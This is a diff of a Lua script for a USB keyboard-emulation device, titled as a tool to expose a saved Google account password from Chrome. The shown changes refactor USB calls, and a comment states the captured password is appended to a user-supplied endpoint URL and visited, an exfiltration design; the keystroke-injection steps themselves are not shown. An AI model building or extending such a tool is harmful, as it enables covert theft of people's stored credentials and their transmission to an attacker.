@@ -1,9 +1,9 @@
 ---
 --- expose saved Google account password from Chrome
 ---
+require("common")
 
-usb = luausb.create({ id = 0, type = "keyboard" })
-kb = usb.dev[1]
+kb = luausb.create({ id = 0, type = "keyboard" })
 
 -- This URL will be visited with the captured password appended to the end
 local endpoint = prompt("Endpoint querystring", "https://localhost/index.php?q=")
@@ -12,7 +12,7 @@ while true do
     print("idle")
 
     -- poll until usb plugged in
-    while usb.state() == "not attached" do
+    while luausb.state() == "not attached" do
         wait(1000)
     end
 
@@ -76,7 +76,7 @@ while true do
 
     print("done")
     -- poll until usb unplugged
-    while usb.state() == "configured" do
+    while luausb.state() == "configured" do
         wait(1000)
     end
     print("disconnected")
